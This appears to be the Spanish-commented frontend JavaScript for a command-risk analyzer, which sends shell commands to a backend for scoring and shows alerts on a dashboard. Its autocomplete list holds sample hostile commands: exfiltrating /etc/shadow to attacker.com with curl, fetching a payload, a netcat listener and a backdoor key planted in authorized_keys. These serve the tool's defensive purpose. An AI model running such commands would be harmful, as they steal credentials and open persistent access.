// Security Monitor - Frontend JavaScript

document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
});

function initializeApp() {
    // Configurar event listeners
    setupEventListeners();
    
    // Cargar dashboard inicial
    loadDashboard();
    
    // Configurar actualización automática del dashboard
    setInterval(loadDashboard, 30000); // Cada 30 segundos
    
    console.log('🔍 Security Monitor - Frontend inicializado');
}

function setupEventListeners() {
    const commandForm = document.getElementById('commandForm');
    if (commandForm) {
        commandForm.addEventListener('submit', handleCommandSubmit);
    }
    
    // Agregar enter para enviar comando
    const commandInput = document.getElementById('command');
    if (commandInput) {
        commandInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                handleCommandSubmit(e);
            }
        });
        
        // Auto-completar comandos comunes
        setupAutoComplete(commandInput);
    }
}

function setupAutoComplete(input) {
    const commonCommands = [
        'sudo cat /etc/passwd',
        'sudo cat /etc/shadow',
        'find / -name "*.ssh" 2>/dev/null',
        'nc -l -p 4444',
        'chmod 777 /tmp/backdoor',
        'curl -X POST https://attacker.com/exfil -d @/etc/shadow',
        'whoami && id && uname -a',
        'ps aux | grep ssh',
        'netstat -tulpn',
        'ss -tulpn',
        'lsof -i',
        'crontab -e',
        'systemctl status',
        'iptables -L',
        'nmap -sS 192.168.1.0/24',
        'wget http://malicious.com/payload.sh',
        'base64 /etc/passwd | curl -X POST http://attacker.com',
        'dd if=/dev/mem bs=1k',
        'strings /proc/1/mem',
        'echo "backdoor" >> ~/.ssh/authorized_keys'
    ];
    
    input.addEventListener('input', function() {
        const value = this.value.toLowerCase();
        if (value.length > 2) {
            const matches = commonCommands.filter(cmd => 
                cmd.toLowerCase().includes(value)
            );
            // Podrías implementar un dropdown de sugerencias aquí
        }
    });
}

async function handleCommandSubmit(e) {
    e.preventDefault();
    
    const command = document.getElementById('command').value.trim();
    const user = document.getElementById('user').value.trim();
    
    if (!command) {
        showError('Por favor ingresa un comando para analizar');
        return;
    }
    
    if (!user) {
        showError('Por favor ingresa un nombre de usuario');
        return;
    }
    
    // Mostrar loading
    showLoading(true);
    hideResults();
    
    try {
        const response = await fetch('/api/analyze', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                command: command,
                user: user
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            displayAnalysisResult(result.data);
            loadDashboard(); // Actualizar dashboard después del análisis
            
            // Limpiar formulario para el siguiente comando
            document.getElementById('command').value = '';
            document.getElementById('command').focus();
        } else {
            showError('Error en el análisis: ' + result.error);
        }
    } catch (error) {
        showError('Error de conexión: ' + error.message);
        console.error('Error:', error);
    } finally {
        showLoading(false);
    }
}

function showLoading(show) {
    const loading = document.getElementById('loading');
    if (loading) {
        loading.style.display = show ? 'block' : 'none';
    }
}

function hideResults() {
    const resultPanel = document.getElementById('resultPanel');
    if (resultPanel) {
        resultPanel.style.display = 'none';
    }
}

function showError(message) {
    // Crear un toast de error temporal
    const toast = document.createElement('div');
    toast.className = 'error-toast';
    toast.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
        color: white;
        padding: 15px 20px;
        border-radius: 8px;
        box-shadow: 0 5px 15px rgba(231, 76, 60, 0.3);
        z-index: 1000;
        animation: slideIn 0.3s ease-out;
        max-width: 400px;
        word-wrap: break-word;
    `;
    toast.textContent = '❌ ' + message;
    
    document.body.appendChild(toast);
    
    // Remover después de 5 segundos
    setTimeout(() => {
        toast.style.animation = 'fadeOut 0.3s ease-out';
        setTimeout(() => {
            if (toast.parentNode) {
                toast.parentNode.removeChild(toast);
            }
        }, 300);
    }, 5000);
}

function displayAnalysisResult(data) {
    const resultPanel = document.getElementById('resultPanel');
    const resultDiv = document.getElementById('analysisResult');
    
    if (!resultPanel || !resultDiv) return;
    
    // Validar y normalizar datos
    const safeData = {
        original_command: data.original_command || 'Comando no disponible',
        user: data.user || 'Usuario desconocido',
        risk_level: data.risk_level || 'BAJO',
        risk_score: typeof data.risk_score === 'number' ? data.risk_score : 0,
        threat_categories: data.threat_categories || [],
        reasons: data.reasons || [],
        recommendations: data.recommendations || [],
        is_blocked: data.is_blocked || false,
        processing_time: data.processing_time || 'N/A',
        tokens: data.tokens || []
    };
    
    const riskClass = getRiskClass(safeData.risk_level);
    const riskIcon = getRiskIcon(safeData.risk_level);
    
    resultDiv.innerHTML = `
        <div class="result-summary fade-in">
            <div class="result-header">
                <h3>🎯 Comando Analizado</h3>
                <div class="alert-command">${escapeHtml(safeData.original_command)}</div>
            </div>
            
            <div class="result-row">
                <div class="result-col">
                    <h3>👤 Usuario</h3>
                    <p><strong>${escapeHtml(safeData.user)}</strong></p>
                </div>
                
                <div class="result-col">
                    <h3>⚠️ Nivel de Riesgo</h3>
                    <span class="risk-badge ${riskClass}">${riskIcon} ${safeData.risk_level}</span>
                </div>
            </div>
            
            <div class="result-row">
                <div class="result-col">
                    <h3>📈 Puntuación de Riesgo</h3>
                    <div class="risk-score">
                        <span class="score-number">${safeData.risk_score.toFixed(2)}</span>
                        <span class="score-total">/10.0</span>
                        <div class="progress-bar">
                            <div class="progress-fill ${riskClass}" style="width: ${(safeData.risk_score / 10) * 100}%"></div>
                        </div>
                    </div>
                </div>
                
                <div class="result-col">
                    <h3>⏱️ Tiempo de Procesamiento</h3>
                    <p><strong>${safeData.processing_time}</strong></p>
                </div>
            </div>
            
            ${safeData.threat_categories && safeData.threat_categories.length > 0 ? `
                <div class="result-section">
                    <h3>🚨 Categorías de Amenaza</h3>
                    <div class="threat-categories">
                        ${safeData.threat_categories.map(cat => `<span class="risk-badge risk-medio">${getThreatIcon(cat)} ${cat}</span>`).join('')}
                    </div>
                </div>
            ` : ''}
            
            ${safeData.reasons && safeData.reasons.length > 0 ? `
                <div class="result-section">
                    <h3>💡 Razones del Análisis</h3>
                    <ul class="reasons-list">
                        ${safeData.reasons.map(reason => `<li>${escapeHtml(reason)}</li>`).join('')}
                    </ul>
                </div>
            ` : ''}
            
            ${safeData.recommendations && safeData.recommendations.length > 0 ? `
                <div class="result-section">
                    <h3>🔧 Recomendaciones</h3>
                    <ul class="recommendations-list">
                        ${safeData.recommendations.map(rec => `<li>${escapeHtml(rec)}</li>`).join('')}
                    </ul>
                </div>
            ` : ''}
            
            ${safeData.is_blocked ? '<div class="blocked-warning">🚫 <strong>COMANDO BLOQUEADO</strong> - Este comando ha sido marcado como crítico y ha sido bloqueado automáticamente</div>' : ''}
            
            ${safeData.tokens && safeData.tokens.length > 0 ? `
                <div class="result-section">
                    <h3>🔍 Análisis de Tokens</h3>
                    <div class="tokens-container">
                        ${safeData.tokens.map(token => `
                            <span class="token token-${(token.Type || 'unknown').toLowerCase()}" title="Tipo: ${token.Type || 'Unknown'}">
                                ${escapeHtml(token.Value || '')}
                            </span>
                        `).join('')}
                    </div>
                </div>
            ` : ''}
        </div>
    `;
    
    resultPanel.style.display = 'block';
    resultPanel.classList.add('slide-up');
    resultPanel.scrollIntoView({ behavior: 'smooth' });
}

async function loadDashboard() {
    try {
        const response = await fetch('/api/dashboard');
        const data = await response.json();
        
        if (data.success) {
            updateDashboard(data.data);
        }
    } catch (error) {
        console.error('Error loading dashboard:', error);
    }
}

function updateDashboard(data) {
    // Validar y normalizar los datos del dashboard
    const safeData = {
        total_commands: Math.max(0, parseInt(data.total_commands) || 0),
        high_risk_commands: Math.max(0, parseInt(data.high_risk_commands) || 0),
        recent_alerts: data.recent_alerts || []
    };
    
    // Actualizar contadores con valores seguros
    const totalElement = document.getElementById('totalCommands');
    const highRiskElement = document.getElementById('highRiskCommands');
    
    if (totalElement) {
        animateNumber(totalElement, safeData.total_commands);
    }
    
    if (highRiskElement) {
        animateNumber(highRiskElement, safeData.high_risk_commands);
    }
    
    // Mostrar alertas recientes
    const alertsList = document.getElementById('alertsList');
    if (alertsList && safeData.recent_alerts.length > 0) {
        alertsList.innerHTML = safeData.recent_alerts.map(alert => {
            // Validar y normalizar datos del alert
            const safeAlert = {
                user: alert.user || 'Usuario desconocido',
                original_command: alert.original_command || 'Comando no disponible',
                risk_level: alert.risk_level || 'BAJO',
                risk_score: typeof alert.risk_score === 'number' ? Math.max(0, alert.risk_score) : 0,
                timestamp: alert.timestamp || new Date().toISOString()
            };
            
            return `
                <div class="alert-item fade-in">
                    <div class="alert-header">
                        <span><strong>Usuario:</strong> ${escapeHtml(safeAlert.user)}</span>
                        <span class="alert-time">${formatTimestamp(safeAlert.timestamp)}</span>
                    </div>
                    <div class="alert-command">${escapeHtml(safeAlert.original_command)}</div>
                    <div class="alert-footer">
                        <span class="risk-badge ${getRiskClass(safeAlert.risk_level)}">${getRiskIcon(safeAlert.risk_level)} ${safeAlert.risk_level}</span>
                        <span class="alert-score">Score: ${safeAlert.risk_score.toFixed(2)}</span>
                    </div>
                </div>
            `;
        }).join('');
        
        document.getElementById('dashboardResults').style.display = 'block';
    } else if (alertsList) {
        alertsList.innerHTML = '<p>No hay alertas recientes. Analiza algunos comandos para ver resultados aquí.</p>';
    }
    
    console.log('Dashboard actualizado:', safeData);
}

function animateNumber(element, targetNumber) {
    const currentNumber = parseInt(element.textContent) || 0;
    
    // Si el número objetivo es el mismo, no animar
    if (currentNumber === targetNumber) {
        return;
    }
    
    // Configuración de la animación
    const duration = 1000; // 1 segundo
    const steps = 30; // 30 pasos para suavidad
    const stepDuration = duration / steps;
    const increment = (targetNumber - currentNumber) / steps;
    
    let current = currentNumber;
    let stepCount = 0;
    
    const timer = setInterval(() => {
        stepCount++;
        current += increment;
        
        // En el último paso, asegurar que sea exactamente el número objetivo
        if (stepCount >= steps) {
            element.textContent = targetNumber;
            clearInterval(timer);
        } else {
            element.textContent = Math.round(current);
        }
    }, stepDuration);
}

function getRiskClass(riskLevel) {
    const riskMapping = {
        'SIN_RIESGO': 'risk-sin_riesgo',
        'BAJO': 'risk-bajo', 
        'MEDIO': 'risk-medio',
        'ALTO': 'risk-alto',
        'CRÍTICO': 'risk-crítico'
    };
    
    return riskMapping[riskLevel] || 'risk-bajo';
}

function getRiskIcon(riskLevel) {
    const iconMapping = {
        'SIN_RIESGO': '✅',
        'BAJO': '⚠️',
        'MEDIO': '🔶', 
        'ALTO': '🔴',
        'CRÍTICO': '🚨'
    };
    
    return iconMapping[riskLevel] || '⚠️';
}

function getThreatIcon(threatCategory) {
    const iconMapping = {
        'ESCALACIÓN_PRIVILEGIOS': '⬆️',
        'EXFILTRACIÓN_DATOS': '📤',
        'RECONOCIMIENTO': '🔍',
        'PERSISTENCIA': '🔒',
        'MOVIMIENTO_LATERAL': '↔️',
        'EVASIÓN_DEFENSAS': '🛡️',
        'ACTIVIDAD_RED': '🌐',
        'MODIFICACIÓN_SISTEMA': '⚙️'
    };
    
    return iconMapping[threatCategory] || '⚠️';
}

function formatTimestamp(timestamp) {
    const date = new Date(timestamp);
    return date.toLocaleString('es-ES', {
        day: '2-digit',
        month: '2-digit', 
        hour: '2-digit',
        minute: '2-digit'
    });
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Funciones de utilidad adicionales
function showSuccessMessage(message) {
    const toast = document.createElement('div');
    toast.className = 'success-toast';
    toast.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);
        color: white;
        padding: 15px 20px;
        border-radius: 8px;
        box-shadow: 0 5px 15px rgba(39, 174, 96, 0.3);
        z-index: 1000;
        animation: slideIn 0.3s ease-out;
    `;
    toast.textContent = '✅ ' + message;
    
    document.body.appendChild(toast);
    
    setTimeout(() => {
        toast.style.animation = 'fadeOut 0.3s ease-out';
        setTimeout(() => {
            if (toast.parentNode) {
                toast.parentNode.removeChild(toast);
            }
        }, 300);
    }, 3000);
}

// Agregar estilos CSS dinámicamente para elementos que no están en el CSS principal
function addDynamicStyles() {
    const style = document.createElement('style');
    style.textContent = `
        .result-header {
            margin-bottom: 20px;
        }
        
        .result-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 20px;
        }
        
        .result-col h3 {
            margin-bottom: 10px;
        }
        
        .result-section {
            margin: 20px 0;
            padding: 15px;
            background: rgba(248, 249, 250, 0.5);
            border-radius: 8px;
            border-left: 4px solid #667eea;
        }
        
        .threat-categories {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
        }
        
        .reasons-list, .recommendations-list {
            margin-left: 20px;
        }
        
        .reasons-list li, .recommendations-list li {
            margin-bottom: 8px;
            color: #34495e;
        }
        
        .blocked-warning {
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            color: white;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
            margin: 20px 0;
            font-weight: bold;
        }
        
        .tokens-container {
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
            padding: 10px;
            background: #f8f9fa;
            border-radius: 8px;
            max-height: 200px;
            overflow-y: auto;
        }
        
        .token {
            padding: 4px 8px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 0.85em;
            border: 1px solid #dee2e6;
        }
        
        .token-command { background: #e3f2fd; color: #1565c0; }
        .token-parameter { background: #f3e5f5; color: #7b1fa2; }
        .token-flag { background: #fff3e0; color: #ef6c00; }
        .token-path { background: #e8f5e8; color: #2e7d32; }
        .token-ip_address { background: #ffebee; color: #c62828; }
        .token-url { background: #e1f5fe; color: #0277bd; }
        .token-variable { background: #fce4ec; color: #ad1457; }
        .token-string { background: #f1f8e9; color: #558b2f; }
        
        .risk-score {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .score-number {
            font-size: 1.5em;
            font-weight: bold;
            color: #2c3e50;
        }
        
        .score-total {
            color: #7f8c8d;
        }
        
        .progress-bar {
            width: 100px;
            height: 8px;
            background: #ecf0f1;
            border-radius: 4px;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            transition: width 0.5s ease;
            border-radius: 4px;
        }
        
        .alert-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
        }
        
        .alert-time {
            font-size: 0.85em;
            color: #7f8c8d;
        }
        
        .alert-footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 8px;
        }
        
        .alert-score {
            font-size: 0.9em;
            color: #7f8c8d;
            font-weight: 600;
        }
        
        @keyframes fadeOut {
            from { opacity: 1; }
            to { opacity: 0; }
        }
        
        @media (max-width: 768px) {
            .result-row {
                grid-template-columns: 1fr;
            }
            
            .alert-header {
                flex-direction: column;
                align-items: flex-start;
                gap: 5px;
            }
        }
    `;
    
    document.head.appendChild(style);
}

// Inicializar estilos dinámicos cuando se carga la página
document.addEventListener('DOMContentLoaded', addDynamicStyles);